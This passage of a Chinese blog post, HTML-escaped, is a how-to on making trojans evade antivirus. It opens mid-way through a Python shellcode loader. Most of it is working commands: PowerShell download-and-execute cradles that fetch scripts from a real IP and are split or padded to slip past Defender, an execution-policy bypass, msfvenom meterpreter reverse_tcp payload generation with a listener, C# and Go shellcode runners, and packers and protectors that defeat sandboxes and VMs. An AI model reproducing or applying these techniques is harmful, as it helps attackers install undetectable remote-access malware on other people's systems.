ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(0),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(ptr),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(0),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.c_int(0),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.pointer(ctypes.c_int(0)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;混淆加密免杀&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（ 1 ）正常情况 直接执行&lt;br&gt;
（ 2 ）base 64 先编码，在进行解码操作，后者为新木马&lt;br&gt;
（ 3 ）aes+base64:msf 生成 base 64 编码木马，对木马 aes 加密，而后将 aes 解密操作变成可执行&lt;br&gt;
（ 4 ）序列化与反序列化&lt;br&gt;
（ 5 ）另外的 Xor，Rc4 等加密算法都可以实现测试&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不同的打包器打包木马&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对上述 5 种方法产生的木马进行打包&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;pyinstaller 使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pyinstaller -F test.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;py2exe 打包&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python setup.py py2exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Nuitka 使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-import-to=utils,src --output-dir=out 108.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ps1-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ps1-免杀&#34;&gt;#&lt;/a&gt; ps1 免杀&lt;/h4&gt;
&lt;p&gt;cs 可以生成 powershell 文件和 powershell command 两种。第一种是文件模式，上线代码在 ps 1 种，直接运行就可以上线，第二种是一个 txt，复制代码用 cmd 执行即可上线。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手工混淆&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;先base 64 编码再去执行解码后的代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;bb=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(&lt;span class=&#34;variable&#34;&gt;$x&lt;/span&gt;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;powershell绕过执行策略执行ps1 脚本的方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell -ExecutionPolicy bypass -File hr.ps1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在编码后的代码中添加一些垃圾数据，进行replace替换为空，解码执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- -----xiaosedi------xiaosedi-----xiaosedi------------.replace(&amp;#x27;xiaosedi&amp;#x27;,&amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在原型代码中添加一些垃圾数据，编码解码之后，进行replace替换为空，干扰检测。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;分离代码&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将恶意代码的base 64 藏在web上，通过http请求去拿数据，再通过解码执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;d= ((New-Object System.Net.Webclient).DownloadString(&amp;#x27;http://x.x.x.x/&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;.txt&amp;#x27;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&lt;span class=&#34;variable&#34;&gt;$d&lt;/span&gt;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以配合手工混淆，将原型或编码后的代码加上干扰数据后放至远程http上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;项目混淆&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/danielbohannon/Invoke-Obfuscation&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;加载模块：Import-Module ./Invoke-Obfuscation.psd1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;运行程序：Invoke-Obfuscation&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;原型文件路径：set scriptpath C:\Users\ 86135 \Desktop\1.ps1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;部分代码编码：set scriptblock &amp;#x27;xxxx&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;进入编码：encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;选择编码： 1 - 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出文件：out C:\Users\ 86135 \Desktop\11.ps1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;木马转字节流 特征修改&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找到关键木马，利用脚本将木马的核心代码转化为字节流，注意字节流不能加引号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;[Byte[]]$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;x=[Byte[]](1,23,315,124,......,2512)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将shellcode中的全部的代码进行变量替换，使其与原型发生很大不同&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;即通过fuzz的思想，看修改哪部分代码是defender检测的进行修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ps1-cmd-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ps1-cmd-免杀&#34;&gt;#&lt;/a&gt; ps1 cmd 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;执行远程原型木马&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;执行远程原型木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell -nop -w hidden -c &amp;quot;IEX ((new-object net.webclient).downloadstring(&amp;#x27;http://x.x.x.x/x.ps1&amp;#x27;))&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;替换变量&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;替换变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell &amp;quot;$a=&amp;#x27;IEX((New-Object Net.WebClient).DownloadString(&amp;#x27;&amp;#x27;ht&amp;#x27;;$b=&amp;#x27;tp://47.94.236.117/x.ps1&amp;#x27;&amp;#x27;));&amp;#x27;;IEX ($a+$b)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;复制powershell执行程序&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.\bypass.exe &amp;quot;$a=&amp;#x27;IEX((New-Object Net.WebClient).DownloadString(&amp;#x27;&amp;#x27;ht&amp;#x27;;$b=&amp;#x27;tp://47.94.236.117/x.ps1&amp;#x27;&amp;#x27;));&amp;#x27;;IEX ($a+$b)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;垃圾数据干扰&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;垃圾数据干扰&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal - w Normal -w Normal -w Normal -w Normal -w Normal -w Normal ...... Nor mal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).Downl oadString(&amp;#x27;ht&amp;#x27;+&amp;#x27;tp://47.94.236.117/x.ps1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;替换原型木马关键字进行干扰&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;替换原型木马关键字进行干扰&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;powershell -NoExit &amp;quot;$c1=&amp;#x27;IEX(New-Object Net.WebClient).Downlo&amp;#x27;;$c2=&amp;#x27;123(&amp;#x27;&amp;#x27;http://47.94.236.117/x.ps1&amp;#x27;&amp;#x27;)&amp;#x27;.Replace(&amp;#x27;123&amp;#x27;,&amp;#x27;adString&amp;#x27;);IEX ($c1+$c2)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Ladon 混淆命令&lt;br&gt;
通过 ladon 将 powershell 免杀木马生成为 exe 可执行文件&lt;br&gt;
通过 ps2exe 生成 exe 文件：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL01TY2hvbHRlcy9XaW4tUFMyRVhF&#34;&gt;https://github.com/MScholtes/Win-PS2EXE&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;c-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#c-免杀&#34;&gt;#&lt;/a&gt; C# 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;原型木马&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;原型木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -e x86/shikata_ga_nai -i 15 -f csharp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用运行shellcode的C&lt;span class=&#34;comment&#34;&gt;#脚本运行此代码，生成exe文件测试木马&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;混淆加密&lt;br&gt;
先用 msf 生成 64 位木马&lt;br&gt;
用加密脚本进行加密，通过 key 来混淆原型木马获得字节流数据&lt;br&gt;
再用解密脚本进行解密，用 key 与字节流数据运行脚本进行干扰杀毒检测&lt;br&gt;
而后打包为 exe 可执行文件测试木马&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件混淆&lt;br&gt;
一些杀毒软件会将木马放置到 VT 或者沙盒中运行，通过行为检测是否是 木马；而 exe 文件本身是支持反编译的，进行逆向可以找到源码中的 shellcode。 沙盒或许能识别到此 shellcode，通过一些软件实现加密原有 exe 程序，干扰杀 毒软件的判断能力。&lt;br&gt;
开源 - ConfuserEx 通过将原型木马加密&lt;br&gt;
付费 - VirboxProtector&lt;br&gt;
 看工具支持哪些语言，如果此工具不支持其他语言，加密后原功能会失效&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;go-免杀&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#go-免杀&#34;&gt;#&lt;/a&gt; Go 免杀&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;原型木马&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过 cs 生成 c 代码，利用 go 脚本去运行 c 程序&lt;br&gt;
用运行 shellcode 的 go 脚本运行代码，直接运行或者生成 exe 文件测试木马&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;运行1.go脚本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;go run 1.go&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译1.go脚本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;go build 1.go&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;去弹窗编译1.go脚本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;go build -ldflags=&amp;quot;-H windowsgui -w -s&amp;quot; 1.go&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;分离代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如将 shellcode 进行 http 请求获取，或者以参数方式加入，又或者从资源中请求 shellcode&lt;br&gt;
 准备一个 AES 加密脚本，需要添加 shellcode 为要加密的内容，运行之后会随机生成 key，并利用此 key 将 shellcode 加密后的代码打印出来&lt;br&gt;
再准备一个 AES 解密脚本，需要输入参数 key 和要执行的代码，此脚本运行之后会利用 key 去解密还原 shellcode，将此 AES 解密脚本打包为 exe 文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分离代码 自定义代码&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;cs或msf生成raw格式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f hex&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写go脚本直接从参数中获取shellcode运行，运行exe程序时设置参数为hex木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;go build -ldflags &amp;quot;-s -w -H=windowsgui&amp;quot; 5.go&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;分离代码 资源分离&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;go 代码中写明要从某个文件获取代码，可以只想 msf/cs 生成的 bin 文件生成 exe 文件之后，将 bin 文件放置代码中指向的目录中执行 exe 就会读取木马并执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保护混淆&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过软件 SafengineShielden 进行保护 混淆 禁止 VT 调试 禁止虚拟机运行等特点&lt;/p&gt;
